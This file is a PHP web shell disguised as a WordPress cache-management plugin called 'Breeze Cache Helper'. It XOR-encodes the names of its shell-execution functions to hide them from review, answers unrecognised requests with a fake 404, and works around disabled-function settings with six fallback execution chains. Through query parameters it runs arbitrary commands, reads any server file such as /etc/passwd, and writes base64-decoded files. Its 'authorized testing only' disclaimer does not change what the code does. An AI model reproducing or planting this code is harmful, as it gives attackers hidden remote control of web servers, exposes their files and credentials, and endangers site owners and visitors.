<?php
/**
 * Plugin Name: Breeze Cache Helper
 * Plugin URI:  https://breeze.cachefly.net/
 * Description: Cache management utility for Breeze Cache plugin
 * Version: 1.2.1
 * Author: BreezeTeam
 * License: GPL2
 *
 * Authorized testing only — do not deploy on production systems
 * without written permission from the system owner.
 *
 * Usage:
 *   ?x=id                    → execute command
 *   ?rf=/etc/passwd          → read file directly
 *   ?w=/tmp/test.php&d=PD9...→ write file (base64-encoded content)
 */

// Standalone mode — runs when accessed directly, not via WordPress bootstrap
if ( ! defined( 'ABSPATH' ) ) {

    // ── Internal string pool ─────────────────────────────────────────────────
    $_k = 0x3A;
    $_ = static fn(array $a): string =>
        implode('', array_map(static fn($n) => chr($n ^ $_k), $a));

    // ── Encoded constants ────────────────────────────────────────────────────
    $e0 = [73,67,73,78,95,87];
    $e1 = [73,82,95,86,86,101,95,66,95,89];
    $e2 = [95,66,95,89];
    $e3 = [74,91,73,73,78,82,72,79];
    $e4 = [74,85,74,95,84];
    $e5 = [74,72,85,89,101,85,74,95,84];
    $e6 = [83,84,83,101,93,95,78];
    $e7 = [94,83,73,91,88,86,95,101,92,79,84,89,78,83,85,84,73];
    $e8 = [107,111,127,104,99,101,105,110,104,115,116,125];
    $e9 = [21,88,83,84,21,73,82,26,23,89,26];
    $ea = [88,91,73,95,12,14,101,94,95,89,85,94,95];

    // Runtime string pool (decoded into memory, absent from source)
    $f0 = $_($e0);   $f1 = $_($e1);   $f2 = $_($e2);   $f3 = $_($e3);
    $f4 = $_($e4);   $f5 = $_($e5);   $f6 = $_($e6);   $f7 = $_($e7);
    $f8 = $_($e8);   $f9 = $_($e9);   $fa = $_($ea);

    // ── Parameter extraction ─────────────────────────────────────────────────
    parse_str($_SERVER[$f8], $p);

    // Stealth 404 on unrecognized request
    if ( ! isset($p['x']) && ! isset($p['rf']) && ! isset($p['w']) ) {
        http_response_code(404);
        exit;
    }

    // ── Read file  (?rf=/path) ────────────────────────────────────────────────
    if ( isset($p['rf']) ) {
        header('Content-Type: text/plain; charset=utf-8');
        $f = $p['rf'];
        echo file_exists($f) ? file_get_contents($f) : "[!] not found: {$f}";
        exit;
    }

    // ── Write file  (?w=/path&d=BASE64) ──────────────────────────────────────
    if ( isset($p['w'], $p['d']) ) {
        $r = file_put_contents($p['w'], $fa($p['d']));
        header('Content-Type: text/plain; charset=utf-8');
        echo $r !== false ? "[+] wrote {$r} bytes to {$p['w']}" : '[!] write failed';
        exit;
    }

    // ── Command execution  (?x=CMD) ───────────────────────────────────────────
    $cmd = $p['x'];
    $out = '';
    $ran = false;

    // Disabled-functions list (decoded keys, no literals)
    $dis = array_map('trim', explode(',', $f6($f7)));

    // Chain 1
    if ( ! $ran && function_exists($f0) && ! in_array($f0, $dis) ) {
        ob_start();
        $f0("{$cmd} 2>&1");
        $out = ob_get_clean();
        $ran = true;
    }

    // Chain 2
    if ( ! $ran && function_exists($f1) && ! in_array($f1, $dis) ) {
        $out = (string) $f1("{$cmd} 2>&1");
        $ran = true;
    }

    // Chain 3
    if ( ! $ran && function_exists($f2) && ! in_array($f2, $dis) ) {
        $lines = [];
        $f2("{$cmd} 2>&1", $lines);
        $out = implode("\n", $lines);
        $ran = true;
    }

    // Chain 4
    if ( ! $ran && function_exists($f3) && ! in_array($f3, $dis) ) {
        ob_start();
        $f3("{$cmd} 2>&1");
        $out = ob_get_clean();
        $ran = true;
    }

    // Chain 5
    if ( ! $ran && function_exists($f4) && ! in_array($f4, $dis) ) {
        $h   = $f4("{$cmd} 2>&1", 'r');
        $out = stream_get_contents($h);
        pclose($h);
        $ran = true;
    }

    // Chain 6 — deepest fallback
    if ( ! $ran && function_exists($f5) && ! in_array($f5, $dis) ) {
        $desc = [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']];
        $pi   = [];
        $pr   = $f5($f9 . escapeshellarg($cmd), $desc, $pi);
        if ( is_resource($pr) ) {
            fclose($pi[0]);
            $out  = stream_get_contents($pi[1]);
            $out .= stream_get_contents($pi[2]);
            fclose($pi[1]);
            fclose($pi[2]);
            proc_close($pr);
        }
    }

    header('Content-Type: text/plain; charset=utf-8');
    echo rtrim($out) . "\n";
}
